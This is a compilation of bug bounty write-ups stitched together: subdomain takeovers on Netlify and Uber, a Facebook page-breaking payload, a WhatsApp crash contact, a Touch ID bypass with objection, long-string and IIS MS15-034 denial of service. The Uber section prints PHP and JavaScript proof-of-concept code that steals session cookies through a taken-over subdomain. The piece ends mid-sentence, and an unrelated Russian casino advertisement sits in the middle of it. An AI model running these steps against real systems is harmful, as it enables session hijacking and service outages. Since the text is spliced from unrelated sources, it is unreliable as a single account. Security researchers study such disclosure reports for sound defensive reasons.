My name is Ali and i am security researcher from Pakistan. In this article i will explain how i takeover a subdomain which is mapped on netlify. Netlify is platform for web developers to upload their web projects and showcase to world.Netlify allow web developers to add custom domain or subdomain to their projects. So i was searching for sites on google using some my recent google dorks.I land to a page site.com/white_hat(i am not disclosing site due to some reasons,Don’t mind :D) and i saw their scope for testing. I just open findsubdomains.com and try to get some subdomains. I saw a subdoamin which was like this hootsuite.site.com and while opening it is just showing “Not Found” Press enter or click to view image in full size I just check the CNAME record of this subdomain because CNAME will tell you on which 3rd party site the subdomain is mapped.So i got this CNAME. I register on netlify.com and upload the web project first.Then it ask me to add custom subdomain. Press enter or click to view image in full size So I just add the subdomain and click on verify. Press enter or click to view image in full size So on few clicks the subdomain was mine :D I fully takeover the site. I uploaded a screenshot on twitter :D After 15 minutes of reporting i got reply from their CTO and he rewarded me 200$ for this takeover. Press enter or click to view image in full size I hope you enjoyed this takeover and this will help you to understand how you can claim subdomain if this was not claimed before.

After reading this I decided to look through some Facebook endpoints to see if it was still viable. After a day or two of looking I found 7 different endpoints vulnerable to this type of attack. At first I thought I hit a gold mine with this type of attack but within a couple of weeks 6/7 bugs got flagged as a dupe of the original report I made. Thanks for reporting this issue to us. After investigating the issue, we have realized that this is a duple of your other report #2444785898871880. As such, this report will not be eligible for a bounty. I’m going to close this one and keep the conversation in the original report. Since the root cause was that Facebook wasn’t limiting the length on parameters they all sadly got classified into one bug. This bug will be the one shown next. Break Facebook Pages for Admins, Editors, and Moderators This bug allowed a malicious user with at least Moderator privileged to permanently break an entire page for the Admins, Editors, and Moderators. This bug was a little weird as I ran into it by accident trying to test for other things, after firing big payloads at the endpoint I kept getting 500 errors, after enough 500 errors the page would completely break This bug required a page to have the appointments function setup, the quickest way to get appointments is creating a button as seen in the video and hitting booking option to set up appointments through Facebook. After that test the button and put in an appointment and then go to the inbox to complete the rest of the bug Proof of Concept 1) Once in the inbox of the victims page hit the create appointment button in the bottom right 2) Put in some text in the box and intercept the request sent to burp suite 3) Send the request to the intruder, highlight the text in the notes_for_customer parameter for the intruder position, set the attack type to battering ram, and go to options and turn off Make unmodified base request 4) Copy the text of a large string(Around 20–60mb) to your clipboard and go to payloads and hit paste until you have about 10 requests to be sent 5) Start the attack and you should start seeing 500 errors. After they all go through the page should be broken Video The other bugs reported use a similar attack type in the bug shown above but with different sized payloads to make it work, as they weren't as impactful I wont be making a full write up about them but if you’re interested in any of them feel free to message me on Facebook to ask.

It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nAuthentication bypass on Uber’s Single Sign-On via subdomain takeover – Arne Swinnen Arne Swinnen Security Blog Menu Close Home Research Exploit Development Mobile Security Publications Web Security Contact 6 Authentication bypass on Uber’s Single Sign-On via subdomain takeover Posted on June 25, 2017 by Arne Swinnen TL;DR: Uber was vulnerable to subdomain takeover on saostatic.uber.com via Amazon CloudFront CDN. Moreover, Uber’s recently deployed Single Sign-On (SSO) system at auth.uber.com, which is based on shared cookies between all *.uber.com subdomains, was found vulnerable to session cookie theft by any compromised *.uber.com subdomain. Therefore, the impact of the subdomain takeover could be increased to Authentication Bypass of Uber’s full SSO system, yielding access to all *.uber.com subdomains protected by it (e.g. vault.uber.com, partners.uber.com, riders.uber.com, etc). Uber resolved the subdomain takeover vulnerability and granted a $5.000 bounty for the two combined issues. Single Sign-On security revisited Generally, SSO systems are (variations of) any of the following three types, in order of popularity: OAuth : Security is mainly based on whitelisted callback URLs of service providers configured at the identity providers, and CSRF protection via the “state” parameter. Flaws are often via open redirect chains, e.g. Authentication bypass on Airbnb via OAuth tokens theft. SAML & friends : Security is based on XML messages signed with pre-exchanged cryptographic keys between service and identity providers. Flaws are often XML Signature bypasses, e.g. OneLogin authentication bypass on WordPress sites that bit Uber before. Shared (session) cookies between subdomains : Security is based on the integrity of all subdomains. Any vulnerability on any subdomain that provides an attacker insight in the shared session cookies issued by the SSO system is fatal. Flaws are thus often RCE, debug logs exposure, subdomain takeover and friends on subdomains, e.g. Authentication bypass on Ubiquity’s Single Sign-On via subdomain takeover I personally believe that the first two in this list have had many problems in the past, but have improved lately in terms of security. The latter SSO based on shared session cookies between subdomains is more a technology from the past, before the former two even existed. By design, it enforces that anything that wants to leverage the SSO system to be a subdomain of the same TLD as where the SSO system is based. Since the security of the SSO system is based on the integrity of the subdomains (see aforementioned report and the Uber case below), this is quite an ironic situation. By design, it encourages to increase the attack surface enormously. Uber case Uber used OAuth as an SSO system for *.uber.com subdomains in the past, as can be seen from this recent public disclosure report by @ngalog : [Uber 8k Bug] Login CSRF + Open Redirect = Account Takeover . However recently, they’ve changed (reverted?) to a SSO system based on shared session cookies among subdomains of *.uber.com. If you now browse to any uber.com subdomain that requires authentication (e.g. central, partners, riders, vault, developer, …), you get redirected to auth.uber.com instead. Once you’ve logged in there and you visit another subdomain, you’re logged in there transparently via the SSO system at auth.uber.com, which issues temporary session cookies for every *.uber.com subdomain after being logged in once. A vulnerability was identified in this SSO system that allows any compromised subdomain on *.uber.com to transparently issue and steal valid session cookies issued for *any* uber.com subdomain by auth.uber.com, as long as the victim had already authenticated once to the SSO. Uber did have some countermeasures in place to prevent this, but these were bypassed and reported together with the subdomain takeover for increased impact. Any compromised *.uber.com subdomain could be used to perform the same attack, although Uber explicitly mentioned several *.uber.com subdomains as out of scope in their bug bounty program policy at the time of reporting (e.g. *.dev.uber.com, *.et.uber.com, drive.uber.com, etc). Subdomain takeover Subdomain saostatic.uber.com was pointing to Amazon Cloudfront CDN via a DNS CNAME, but the hostname was not registered there anymore (dangling pointer). This allowed me to fully takeover this domain, highly similar to Subdomain takeover on rider.uber.com due to non-existent distribution on Cloudfront by Frans Rosén . I effectively took over the subdomain as a Proof of Concept and hosted a simple HTML file as proof here: Authentication bypass In Uber’s SSO system, auth.uber.com acts as Identity Provider and issues temporarily shared session cookies for https://*.uber.com (“domain=uber.com” cookie attribute) to communicate identities to Service Providers (e.g. riders.uber.com, partners.uber.com, central.uber.com, vault.uber.com, developer.uber.com, and many more). Service Providers on their end immediately destroy the incoming temporary shared session cookies in case of erroneous (e.g. issued for other Service Provider) or successful authentication to ensure that the window for theft is small, as can be seen in the below Uber SSO Login diagram: The precious shared session cookie “_csid” can thus only be stolen between steps 9-12, which is a very short period (automatic browser redirects). Although not impossible to exploit (see Jack Whitton’s awesome CSP trick to block certain cookies from being sent to certain domains, coincidentally also on Uber’s bug bounty program ), a more convenient flaw was identified that allows the shared session cookie to remain alive after step 12 in the browser’s cookie store in the diagram above. The issue is that, if the victim is already logged in at https://riders.uber.com (situation after last step 12 in diagram) when receiving a request containing a valid newly generated shared session cookie “_csid” from auth.uber.com, it is simply ignored and remains usable. Hence it stays alive in the browser until its cookie store is cleared. An attacker simply needs to replay step 3 in the above diagram as step 13 and end with an additional hidden request to https://saostatic.uber.com to steal the precious session cookie: So once an attacker gets his/her hands on the victim’s “_csid” shared session cookie for https://riders.uber.com, he/she can execute the normal login flow in their own browser and replace the issued “_csid” cookie value in step 9 to be logged in as the victim, right? Wrong. Uber had another surpising countermeasure in place, namely a variant of login cross-site request forgery protection. This is the actual updated Uber SSO Login diagram: The problem here are the GET param state=CSRFTOKEN and locally scoped state cookie that are added in step 3 by the Service Provider riders.uber.com and verified in step 11. Since we can’t steal these values from the victim’s browser, but only the “_csid” shared session cookie, this means game over, right? Unfortunately, wrong. An attacker can obtain a proper CSRFTOKEN value and accompanying state cookie value from https://riders.uber.com by starting a normal login scenario on their end (e.g. in their own browser or via a simple script). He/she can then relay the auth.uber.com URL generated by https://riders.uber.com in their own browser in step 3 to the victim’s browser to generate & steal the “_csid” shared session cookie for these values, and inject these in his/her own browser login scenario again in step 9. In this manner, the victim effectively generates the “_csid” temporary session token for the attacker’s login scenario in a separate browser, but this works flawlessly (e.g. no IP-based checks between steps were encountered). This still allows exploitation and thus victim impersonation in the following manner (we still assume that the victim is already logged in to auth.uber.com and visits a webpage under control by the attacker, so we basically continue the flow from the above diagram): Proof of concept A PoC says more than a thousand diagrams. In the PoC steps sent to Uber & showcased in the video below, the assumption is made that https://saostatic.uber.com is actually serving a valid SSL certificate in the victim’s browser, which was not the case. However, it could’ve easily been generated with Let’s Encrypt . Open the victim’s browser & browse to https://riders.uber.com. After being redirected to https://auth.uber.com, login with the victim’s credentials so you end up on https://riders.uber.com trips dashboard again. Open a second browser tab in the victim’s browser and browse to https://saostatic.uber.com/prepareuberattack.php. Accept any certificate warnings that you may receive here – again, we’re only simulating that the domain has a valid SSL certificate. Once the page has finished loading you should see a URL, “Cookie: ” string and a “Set-Cookie: ” strings underneath each other. This is all info gathered under the hood by the attacker’s webserver that is required to login as the victim now – everything has been stolen automagically. Open the separate attacker’s browser and setup an intercepting proxy tool to intercept requests and responses. Browse to the URL displayed on the prepareuberattack.php page output and intercept this request. Now copy the “Cookie: …” string displayed on prepareuberattack.php and paste it into the request headers. The response should be a redirect to https://riders.uber.com/trips, indicating successful authentication bypass. Last but not least, copy all the “Set-Cookie: ” lines from the prepareuberattack.php page output and paste them in the response before forwarding it to the browser. This ensures that the stolen cookies are permanently injected in the attacker’s browser. You are now logged in as the victim in the attacker’s browser. In a real attack scenario, an attacker would stealthily load https://saostatic.uber.com/prepareuberattack.php in the victim’s browser, e.g. through an iframe. Likewise, he/she would probably not display the URL and all the cookies on the resulting page, but store this on the server-side, ready to be abused in a stealthy fashion. Although it’s a lengthy explanation, the PoC video showcases how quick & effective exploitation by an attacker can be. The code of the https://saostatic.uber.com/prepareuberattack.php and https://saostatic.uber.com/uberattack.php pages is provided below. This was written quick & dirty for PoC purposes, but it did the job: prepareuberattack.php PHP <html> <body> <script> <?php function HandleHeaderLine( $curl, $header_line ) { preg_match(\"/state=([^;]*);/\", $header_line, $matches); if(sizeof($matches) > 0) { print(\"var cookiestate = '\" . $matches[1] . \"';\\n\"); } preg_match(\"/Location: (.*)/\", $header_line, $matches); if(sizeof($matches) > 0) { print(\"var loc = '\" . trim($matches[1]) . \"';\\n\"); } return strlen($header_line); } $c = curl_init('https://riders.uber.com'); curl_setopt($c, CURLOPT_VERBOSE, 1); curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); curl_setopt($c, CURLOPT_HEADERFUNCTION, \"HandleHeaderLine\"); $page = curl_exec($c); ?> var csrf = loc.substring(loc.lastIndexOf(\"=\")+1); var img = document.createElement(\"IMG\"); img.onerror = function () { var iframe = document.createElement(\"iframe\"); iframe.setAttribute(\"src\",\"https://saostatic.uber.com/uberattack.php?cookiestate=\" + encodeURIComponent(cookiestate) + \"&csrftoken=\" + csrf); iframe.setAttribute(\"width\", \"100%\"); iframe.setAttribute(\"height\", \"10000\"); document.body.appendChild(iframe); } img.src=loc; </script> </body> </html> 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 < html > < body > <script> < ? php function HandleHeaderLine ( $ curl , $ header _ line ) { preg_match ( \"/state=([^;]*);/\" , $ header_line , $ matches ) ; if ( sizeof ( $ matches ) > 0 ) { print ( \"var cookiestate = '\" . $ matches [ 1 ] . \"';\\n\" ) ; } preg_match ( \"/Location: (.*)/\" , $ header_line , $ matches ) ; if ( sizeof ( $ matches ) > 0 ) { print ( \"var loc = '\" . trim ( $ matches [ 1 ] ) . \"';\\n\" ) ; } return strlen ( $ header_line ) ; } $ c = curl_init ( 'https://riders.uber.com' ) ; curl_setopt ( $ c , CURLOPT_VERBOSE , 1 ) ; curl_setopt ( $ c , CURLOPT_RETURNTRANSFER , 1 ) ; curl_setopt ( $ c , CURLOPT_HEADERFUNCTION , \"HandleHeaderLine\" ) ; $ page = curl_exec ( $ c ) ; ? > var csrf = loc . substring ( loc . lastIndexOf ( \"=\" ) + 1 ) ; var img = document . createElement ( \"IMG\" ) ; img . onerror = function ( ) { var iframe = document . createElement ( \"iframe\" ) ; iframe . setAttribute ( \"src\" , \"https://saostatic.uber.com/uberattack.php?cookiestate=\" + encodeURIComponent ( cookiestate ) + \"&csrftoken=\" + csrf ) ; iframe . setAttribute ( \"width\" , \"100%\" ) ; iframe . setAttribute ( \"height\" , \"10000\" ) ; document . body . appendChild ( iframe ) ; } img . src = loc ; </script> < / body > < / html > uberattack.php PHP <html> <body> <?php $cookiestring = \"state=\" . $_GET[\"cookiestate\"] . \"; \"; $interestincookies = array(\"_udid\", \"_csid\", \"sid\"); foreach ($_COOKIE as $name => $value) { if (in_array($name,$interestincookies)) { $cookiestring = $cookiestring . $name . \"=\" . str_replace(' ', '+', $value) . \"; \"; $cookiestringset = $cookiestringset . \"Set-Cookie: \" . $name . \"=\" . str_replace(' ', '+', $value) . \";</br>\"; } } print \"Url: \" .

By simply changing “riders.uber.com” to any other subdomain of uber.com in these two PHP files, an attacker could generate valid sessions for these subdomains on behalf of the victim, e.g. vault.uber.com, partners.uber.com, developer.uber.com, … Recommendations The recommendations provided to Uber were twofold: Resolve the subdomain takeover of saostatic.uber.com by removing the dangling CNAME to AWS CloudFront CDN. Resolve the Authentication Bypass issue by any of the following, in order of priority: Revert the SSO system back to OAuth 2, since this does not have the side-effect of actually encouraging a large attack surface like the current shared session SSO system. Or, implement an IP address check: Store a user’s external IP address when issuing a shared “_csid” session cookie on auth.uber.com (identity provider) and verify that users presenting this shared session cookie to service providers on *.uber.com have the same external IP address, to prevent relay attacks like the one described above. There is a residual risk here, namely when the attacker has the same external IP address as its victim (e.g. on the same corporate network/wireless access point/…). Or, accept the inherent risk and include all *.uber.com subdomains in your bug bounty program scope, since they have the potential to fully compromise the SSO system, including the high-value targets vault.uber.com, partners.uber.com and riders.uber.com Ultimately, Uber removed the dangling CNAME and decided to implement the IP address check to decrease the exposed risk through their current cookie based SSO system. They thus opted to accept the residual risk involved.

Happy to say that I’ve received my first bounty right from Facebook which is considered to be a Tough Platform to get rewarded… Intro…. Myself Pratheesh P Narayanan, I’m pursuing B.tech (CSE) from one of the prestigious institutions in my State (Kerala,India).During my childhood days I had a passion towards computers and other elecronic gadgets. Well,it was my Father who gave me an exposure to the Digital Field. He was always there with me ,he was the first one to understand my passion. Even though i was pretty average on my academics, my Mother knew my passion and stood with me all these years… She motivated me to go for Btech regardless of my poor academic performance -_- I’m not really a Bug hunter or a Whitehat. But I do love Technology and i tried my own ways to break the security of different websites/apps from time to time ;). I had previously reported some Bugs on Google and was awarded with their Hall Of Fame (currently Page 5). About The Bug…. The attacker sends the malicious payload to the victim as a contact. Please note that the payload is embedded within the contact and no way the victim is aware of it. As soon as the payload gets delivered to the victim,his phone immediately crashes. PAYLOAD: // removed[THIS IS AN ANDROID FRAMEWORK ISSUE AND I CANNOT SHARE THE PAYLOAD UNTIL GOOGLE ISSUES A FIX] // NB: The issue is fixed and you need not try using the payload again ;) All i did was embed the Payload on a contact file along with long list of emoticon’s . As soon as the payload is delivered to the victim, the phone displays a notification on the victims phone. As soon as the payload is delivered, the victims phone is crashed. The contact can be send N times to increase the severity of the crash. I was in deep trouble making the Facebook team understand about my bug.Though I had sent Video POC and detailed instructions, they could never reproduce my bug. So I asked them to message me on Whatsapp so that i could sent them the payload. And as Expected, they did message me and i could crash the test device of the Facebook Security Team :) Chat With Facebook Team And it was not enough, i had to reproduce the issue with the Whatsapp Security Team as well, and yeah i did :) Whatsapp Security Team After almost 2 months of waiting,they finally fixed it and rewarded me with $500 and my name was added to Hall Of Fame This is all about my experience on my first bug bounty.I hope I can come up with more Reports in the future.Thanks for your valuable time in reading by Story :) Also, I extend my Gratitude to ABHISHEK SIDHARTH for helping me create this report.

Here’s the full content:\n\nTouch ID Authentication Bypass on Evernote and Dropbox IOS Apps | by Sahil Tikoo | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in Touch ID Authentication Bypass on Evernote and Dropbox IOS Apps Sahil Tikoo 6 min read · Apr 3, 2020 -- 2 Listen Share This blog will walk you through the technique that I used to bypass Touch ID authentication feature implemented on the Login Page in Evernote and Dropbox IOS apps. Just Before Getting Started, I will list down the tools that were used in this process: Iphone 6S with ios 13.3.1 Checkra1n executable for semi tethered Jailbreaking Frida on PC & frida server on device Objection on PC Lets get started folks!! Prologue Jailbreaking ios 13.3.1: First and foremost install checkra1n executable on your PC in my case I had mac OS , you can install the dmg from here https://checkra.in/#release and continue with the entire process of jailbreaking until your device reboots , finally you will be presented with a checkra1n IPA through which cydia and other custom apps can be installed. Jailbroken Iphone 6S with ios 13.3.1 You can refer this blog for the entire Jailbreak process: https://www.redmondpie.com/jailbreak-ios-13.3.1-using-checkra1n-heres-how-guide/ . Once you have a jailbroken device the next step in the process is to install frida server through cydia(a store to download all the apps). Frida server on Iphone 6S Finally Install frida and objection on Your PC in my case I had mac OS, you can install Objection from https://github.com/sensepost/objection/wiki and frida will get automatically installed , you just need to have python3 installed. Methodology Once you have all the tools necessary to test Touch ID feature implemented in the apps , the roadmap is clear and pretty straightforward.Install Evernote and Dropbox apps from the App store and interact with these apps through frida server and objection.Finally Bypass authentication by utilizing commands available in objection. Pre Configuration before Attack Install Evernote and Dropbox apps from the app store , once installed also check if frida and objection are working perfectly or not on your PC .Let us enable TouchID’s for both the apps now. Setting up Touch ID in Evernote Steps: Go to your profile Go to settings Click on passcode Lock Click `Turn Passcode On` Setup the passcode and once its done TouchID will be automatically enabled. Evernote Touch ID enabled Setting up Touch ID in Dropbox Steps: Go to your profile Click on the settings logo on the top left corner Click `Turn Passcode On` Setup the passcode and once its done slide the TouchID button. Dropbox Touch ID enabled Understanding the Attack Let us confirm whether TouchID’s are working or not, after configuring Touch ID for both the apps , close the apps and open them again, if you are presented with a banner like Touch ID for “Evernote” or Touch ID for “Dropbox” then you are good to go. But…. Before we begin the actual attack Lets Understand the bypass first. Note: I will just briefly give you an idea about how it was actually bypassed and then we begin with the practical demo. Basically when a User puts his/her fingerprint for the TouchID auth then a class LAContext is invoked in the application code which in turn calls the evaluatePolicy method , inside this method fingerprint data in the form of a mathematical expression is checked against the fingerprint data stored in Secure Enclave of the device.Depending on the success or failure of the authentication itself, a reply block is invoked that includes a boolean indicating if it was successful or not. So if the auth was successful we get a boolean true else a boolean false return value.We use a command ios ui biometrics_bypass in objection tool for bypassing this boolean value check , after using this command, objection starts interacting with frida server on the device.Frida server during runtime, changes the false value to true , gives heads up to objection and bang we get access. Note: Checkout the entire description about this command and how it works https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass in this post. Final Attack Lets Begin the demo for bypass now.We will go step by step so its easy to understand.The bypassing techniques used in both Dropbox and Evernote are same as described above.So, the steps would remain the same, i will be just adding two different Image POC’s to make it clear that bypass is present on both the apps. Steps: Connect your Iphone with the PC First we need to identify under what names apps are running on the phone. Run frida-ps -U on your PC terminal Press enter or click to view image in full size Frida command on PC terminal 4. The apps are usually running by their own names “Evernote” and “Dropbox” as you can see in the above Image. 5. Open the Evernote App 6. Next step is to run objection with the commands like: objection -g Evernote explore Press enter or click to view image in full size Objection command Evernote 7. Now use ios ui biometrics_bypass command as shown below along with that you can also observe a localized reason in the Image was identified by the agent or we can say frida server, Sometimes frida server or the agent isn’t able to identify the touchID pop up while opening the app and you won’t see the localized reason message in objection so make sure to lock the phone without closing the app and again unlock it quickly to observe that the code was hooked properly. Press enter or click to view image in full size biometric bypass command [Evernote] 8. As you can see below wrong fingerprint attempts were made on the Touch ID , it might sometimes take three attempts to bypass , make sure while making the attempts objection is running in terminal and device is connected with a USB cable. Evernote fingerprint wrong attempts 9. So finally during the 3rd wrong attempt , below are the results on both objection terminal and app GUI as well: Press enter or click to view image in full size Bypass Complete on Evernote app 10. As you can see in the image below , Evernote dashboard accessed by bypassing the fingerprint auth mechanism. Evernote dashboard accessible Similarly for Dropbox as well follow all the steps from step5 to step9.Finally during the 3rd wrong attempt in the case of dropbox as well , below are the results observed on both objection terminal and app GUI : Press enter or click to view image in full size Bypass Complete on Dropbox app Dropbox dashboard also accessible after bypassing the fingerprint auth mechanism. Dropbox dashboard accessible Note:Just let me know through DM on my twitter handle https://twitter.com/viperbluff how this Vulnerability can be patched :-) Hope u guys liked it !!

Это делает игры доступными в любое время. Среди популярных слотов пользователи чаще выбирают Book of Ra от Novomatic и Mega Moolah от Microgaming. Критерии выбора надежного казино Чтобы обеспечить безопасность и прозрачность игры, нужно учитывать несколько ключевых параметров: Лицензия. Надежные площадки, такие как упомянутые выше, обычно имеют лицензии КРАИЛ или международные, например, от Malta Gaming Authority. Методы оплаты. Важны варианты пополнения и вывода средств, включая банковские карты, электронные кошельки и криптовалюты. Бонусы и акции. Платформы предлагают приветственные бонусы, фриспины и программы лояльности, привлекая новых игроков. Отзывы и репутация. Реальные отзывы помогают оценить качество сервиса. Техподдержка. Круглосуточная поддержка делает игру комфортной и безопасной. При выборе платформы стоит проверить каждый критерий, чтобы получить максимально позитивный опыт. Особенности украинских казино онлайн Украинские казино онлайн привлекают игроков благодаря разнообразию игр, гибким бонусным предложениям и прозрачному регулированию. Рассмотрим ключевые аспекты работы этих платформ. Законодательство и регулирование Украинское правительство активно регулирует рынок онлайн-гемблинга. С 2020 года казино обязаны получать лицензию Комиссии по регулированию азартных игр и лотерей (КРАИЛ). Лицензия подтверждает, что платформа соблюдает закон, использует сертифицированные игры и обеспечивает защиту данных игроков. Например, такие известные казино как Cosmolot и Parimatch успешно прошли лицензирование, гарантируя честность и прозрачность. Разнообразие игр Украинские казино отличаются широким выбором развлечений. Игровые автоматы занимают лидирующую позицию, предлагая тысячи вариантов с разными тематиками. В дополнение к слотам популярны рулетка, блэкджек, баккара и покер. Live-игры с реальными дилерами, представленные на платформах вроде Parimatch, создают атмосферу настоящего казино. Также отмечаем наличие джекпотов и турниров, стимулирующих азарт. Бонусы и акции Большинство украинских казино предоставляют привлекательные бонусы. Новички получают приветственные пакеты, такие как депозитные бонусы до 150% и бесплатные вращения на слотах. Постоянные игроки участвуют в программах лояльности, еженедельных акциях и турнирах. Cosmolot, например, известен ежедневными бонусами, а Slotoking продвигает систему кэшбэка. Эти предложения увеличивают шансы на выигрыш и повышают интерес пользователей. Методы платежей в украинских казино онлайн Онлайн-казино в Украине предлагают широкий выбор методов оплаты, чтобы удовлетворить запросы пользователей. Рассмотрим самые популярные варианты и их особенности. Популярные способы депозитов и выводов Мы отмечаем, что самые востребованные методы оплаты включают банковские карты Visa и Mastercard, которые обеспечивают надежность и быстроту транзакций. Также популярны электронные кошельки, такие как Monobank, Приват24 и Qiwi, благодаря удобству и моментальному зачислению средств. Множество казино поддерживают криптовалютные платежи (Bitcoin, Ethereum), что обеспечивает анонимность и высокую безопасность операций. Некоторые платформы предлагают прямые переводы через мобильных операторов, таких как Киевстар и Vodafone, что делает процесс особенно доступным для пользователей без банковских карт. Комиссии и скорость транзакций Размер комиссии зависит от выбранного метода. Обычно операции через банковские карты или электронные кошельки проходят без лишних сборов, тогда как криптовалютные переводы нередко включают сетевые комиссии. Мобильные платежи иногда сопровождаются небольшими дополнительными затратами со стороны оператора. Скорость обработки транзакций особенно важна для игроков. Депозиты через карты и электронные кошельки зачисляются мгновенно, тогда как вывод средств обычно занимает от 1 до 3 рабочих дней. Криптовалютные операции проходят быстрее, среднее время обработки редко превышает несколько часов. Преимущества и недостатки игр в украинских казино онлайн Украинские онлайн-казино предлагают множество игровых возможностей, но важно понимать как их преимущества, так и возможные ограничения. Рассмотрим обе стороны. Основные преимущества Доступность и удобство. Играть можно в любое время и из любого места, будь то смартфон, планшет или компьютер. Многие казино имеют мобильные приложения с адаптивным интерфейсом. Широкий выбор игр. Украинские платформы предлагают сотни слотов, настольных игр, рулеток и live-дилеров. Примеры популярных игр включают «Книга Ра», европейскую рулетку и блэкджек. Бонусные программы. Новые игроки получают приветственные бонусы, а постоянные — кэшбек, фриспины и регулярные акции. Такие игры, как в Cosmolot и Parimatch, часто сопровождаются ежедневными или персонализированными наградами. Безопасность транзакций. Лицензионные казино применяют шифрование данных и предлагают защищённые методы платежей, включая Visa, Приват24 и криптовалюты, что гарантирует безопасность финансовых операций. Правовая защита. С лицензией от КРАИЛ игроки защищены юридически, их данные хранятся в соответствии с украинскими законами. Возможные риски и ограничения Игровая зависимость. Некоторые пользователи могут столкнуться с аддикцией. Надёжные казино предлагают функцию самоисключения или лимитов для контроля. Финансовые потери. Азартные игры не гарантируют доход; ставки связаны с риском потерь. Ограничения доступа. Платформы с лицензией КРАИЛ доступны только пользователям из Украины, а иностранные казино могут быть заблокированы. Скорость вывода средств. В зависимости от метода платежей, процесс может занимать до 3 рабочих дней, что требует планирования. Блокировки и технические проблемы. Иногда из-за сбоев или интернет-ограничений доступ к платформам может быть временно недоступен. Мы всегда рекомендуем взвешивать преимущества и риски, чтобы делать ставки осознанно и получать только позитивные эмоции. Советы для новичков Новые игроки часто сталкиваются с трудностями из-за отсутствия опыта. Давайте разберёмся, как сделать старт в украинских онлайн-казино комфортным и безопасным. Как начать игру без ошибок Выбор лицензированного казино. Играть стоит только на платформах с лицензией КРАИЛ. Это гарантирует защиту данных и честные выплаты. Регистрация с корректными данными. Указываем только реальные данные: имя, дату рождения и контактную информацию, чтобы избежать проблем с выводом средств. Изучение правил игры. Читаем правила каждого автомата или стола, особенно перед ставками на реальные деньги. Это помогает понимать механику и избегать неоправданных потерь. Определение бюджета. Устанавливаем дневной или недельный лимит на ставки. Это предотвратит финансовые риски и сохранит положительные эмоции. Проверка отзывов. Читаем мнения пользователей об условиях вывода средств, поддержке и игровых автоматах. Частые ошибки игроков Игнорирование лицензии. Некоторые новички выбирают незарегистрированные казино из-за бонусов, что может привести к потере средств. Пренебрежение акциями. Игроки не используют приветственные бонусы или программы лояльности, хотя они увеличивают шансы на выигрыш. Отсутствие стратегии. Делать ставки хаотично — одна из типичных ошибок. Лучше придерживаться стратегии и применять аналитику. Эмоциональные решения. Азарт часто мешает вовремя остановиться, что ведёт к превышению бюджета. Неправильный выбор игр. Игры без понимания коэффициентов выигрыша (RTP) могут принести меньше удовольствия и больше потерь. Итог Украинские онлайн-казино продолжают радовать нас своим разнообразием, удобством и безопасностью. Благодаря лицензированию, современным технологиям и широкому выбору игр, каждый игрок может найти платформу, которая идеально соответствует его предпочтениям.

This may lead to the website becoming unavailable or unresponsive. Usually this problem is caused by a vulnerable string hashing implementation. When a long string is sent, the string hashing process will result in CPU and memory exhaustion. This vulnerability was detected by sending strings with various lengths and comparing the measured response times. I found this vulnerability on one of the private program on HackerOne. I found it while creating an account, I used the long password string for testing this vulnerability and I got 500 Internal Server Error. So it was confirmed that it is vulnerable. Now here the minor concern is people always try to find this vulnerability on password function as I did, but you can find this at many places like : Username Firstname or Lastname Email Address (create your own email using temp-mail) Address Text-Area Comment Section and many more..!! I would like to give an example that why username ? Say for example I’m using any social media website and I have created 2 accounts for testing purpose. Now in account A ‘s username I have entered a long string of 1000 characters and I’m searching for account A from account B then 2 things can be happen : Either it will keeping on searching for long time Either the application will crash (500 - Error Code) How I found this vulnerability : Go to https://privateprogram.com/signup Fill the form and enter a long string in password Press enter or click to view image in full size Long String 3. Click on enter and you’ll get 500 Internal Server error if it is vulnerable Press enter or click to view image in full size Server Crash Now many a times it happens that the signup page is not vulnerable to Long String Dos so you can try it while resetting your password. Press enter or click to view image in full size Resetting Password using Long String I found it on resetting password and got successful, so I reported to the company and the gave me bounty of 100$ Press enter or click to view image in full size NOTE : This DoS attack falls under the Application Level DoS and not Network Level DoS so you can report it. In some company’s policy of Out-Of-Scope, you’ll find “Denial of Service” which means Network Level DoS and not Application Level DoS. If the company has stated that “Any kind of DoS” is Out-Of-Scope that means you can’t report either of them.

Today’s topic is about a flaw that I encountered in a company I ran the Pentest privately, where I found an IIS server among its various * .subdomains.com. This specific one had two CVE’s. What I found interesting to share was that at the beginning of my bug bounty journey, I used to report low ‘hanging fruits’ without even trying to exploit them, e.g, banner grabbing. Press enter or click to view image in full size As you can see in the image above, often the banner grabbing itself will be considered low impact and your report will most likely be closed as informative. As time goes by, you get more knowledge, your methodology changes, and you start to improve the way you look at your target, having said that, let’s start: Banner grabbing and bug bounty Banner grabbing is a process to collect details regarding any remote PC on a network and the services running on its open ports. An attacker can make use of banner grabbing in order to discover network hosts and running services with their versions on their open ports and moreover operating systems so that he can exploit it. To make a significant impact on that, check the list of active hosts with the banner displayed, write them down, and start looking for the vulns of the versions. Something simple, but little practiced by beginners, who usually report the low impact vuln without wanting to deepen it enough to become critical. From banner grabbing to DoS and memory corruption I will show you the step by step that I made to transform a banner grabbing in DoS and memory corruption, using only the exploits spread on the internet. The company (which did not allow to be identified then let’s call redacted) had several subdomains, and many of them with their banner exposed, including on ports like ssh, ftp, but my focus will be on port 80 (http), where they did use of a internal ticket system. Discovery: I used the following nmap command to check for banners that could help me in the next approach of the target nmap -Pn -p 80, 443 -sV — script=banner -iL all_subdomains.txt Press enter or click to view image in full size For users who do not want to use nmap, this check could be done by CURL: curl -s -I 192.168.0.100 | grep -e “Server: “ Press enter or click to view image in full size The redacted company allowed DoS in its scope, since I was working locally for it, it was easy to get in touch with the infrastructure team to report on some critical flaw in that regard. Keeping in mind the IIS servers, in a quick search I found exploits to perform DoS on microsoft servers (MS15–034) to not be extensive, you can read more about the vuln here . Detecting the vulnerability: The vulnerability can be triggered by specifying the Range header in an HTTP request. A vulnerable install will respond with an HTTP 416 Requested Range Not Satisfiable error. Press enter or click to view image in full size Am I really getting this error? Great! Following the tutorial of the link above, I had just to specify the valid file and the byte range of 100 and as a result it lead me to a blue screen, it means … DoS! Press enter or click to view image in full size Remember , when dealing with DoS in a bounty bug, check if this type of vuln is allowed, if it’s not and still you find it relevant, communicate the team properly, what I did above was accompanied by the responsible team from the company. Sometimes the same version may have more than one critical vulnerability, which was the case with this IIS server, had previously read that it was possible to run memory dump, let’s see how the result was: Wait, Memory dump? Anything that lets you corrupt the memory on a server has the potential of a remote code execution. At 